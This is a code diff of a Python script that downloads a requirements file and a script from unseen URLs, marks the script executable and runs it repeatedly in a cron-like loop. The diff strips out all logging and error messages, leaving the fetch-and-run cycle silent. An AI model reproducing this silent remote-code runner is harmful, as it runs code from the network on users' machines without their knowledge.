@@ -32,19 +32,15 @@ def create_virtual_environment(env_path):
     try:
         # Create the virtual environment
         subprocess.run([sys.executable, '-m', 'venv', env_path], check=True)
-        print(f"Virtual environment created at {env_path}")
 
         # Install 'requests' in the virtual environment
         pip_executable = os.path.join(env_path, 'bin', 'pip')
         subprocess.run([pip_executable, 'install', 'requests'], check=True)
-        print("'requests' library installed successfully.")
 
         return True
     except subprocess.CalledProcessError as e:
-        print(f"Failed to set up virtual environment or install 'requests'. Error: {e}")
         return False
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
         return False
 
 
@@ -54,21 +50,17 @@ def setup_python_environment(env_path, requirements_path):
 
         # Check if the requirements file exists
         if not os.path.exists(requirements_path):
-            print(f"Requirements file not found: {requirements_path}")
             return None
 
         # Install requirements
         pip_executable = os.path.join(env_path, 'Scripts', 'pip') if os.name == 'nt' else os.path.join(env_path, 'bin', 'pip')
         subprocess.run([pip_executable, 'install', '-r', requirements_path], check=True)
-        print("Requirements installed successfully.")
         
         return pip_executable  # Return pip path for service configuration if needed
 
     except subprocess.CalledProcessError as e:
-        print(f"Failed to set up environment or install requirements. Error: {e}")
         return None
     except Exception as e:
-        print(f"An unexpected error occurred: {e}")
         return None
 
 
@@ -80,9 +72,7 @@ def download_file(url, file_path):
         response.raise_for_status()
         with open(file_path, 'wb') as file:
             file.write(response.content)
-        print(f"Downloaded {file_path} successfully.")
     except requests.exceptions.RequestException as e:
-        print(f"Failed to download {file_path}. Error: {e}")
         pass
 
 def execute_script():
@@ -91,24 +81,20 @@ def execute_script():
     from the virtual environment.
     """
     try:
-        print(f"[{time.ctime()}] Executing {repoFilePath}")
-        result = subprocess.run([pythonPath, repoFilePath], capture_output=True, text=True)
-        print(f"[{time.ctime()}] Execution completed with exit code {result.returncode}")
+        result = subprocess.run([pythonPath, repoFilePath], capture_output=False, text=True)
         if result.stdout:
-            print(f"Output:\n{result.stdout}")
+            pass
         if result.stderr:
-            print(f"Error Output:\n{result.stderr}")
+            pass
     except Exception as e:
-        print(f"[{time.ctime()}] An error occurred while executing the script: {e}")
+        pass
 
 
 # Function to make script executable
 def make_executable(file_path):
     try:
         os.chmod(file_path, 0o755)
-        print(f"{file_path} is now executable.")
     except Exception as e:
-        print(f"Failed to set executable permissions for {file_path}. Error: {e}")
         pass
 
 
@@ -126,7 +112,6 @@ if __name__ == "__main__":
     download_file(requirementsUrl, requirementsFilePath)
     download_file(contentUrl, contentFilePath)
 
-    print("[!] Files saved successfully.")
 
     # Make the main script executable
     make_executable(repoFilePath)
@@ -137,6 +122,5 @@ if __name__ == "__main__":
     # Mimic cron
     while True:
         execute_script()
-        print(f"[{time.ctime()}] Sleeping for {INTERVAL_SECONDS} seconds...")
         time.sleep(INTERVAL_SECONDS)
 
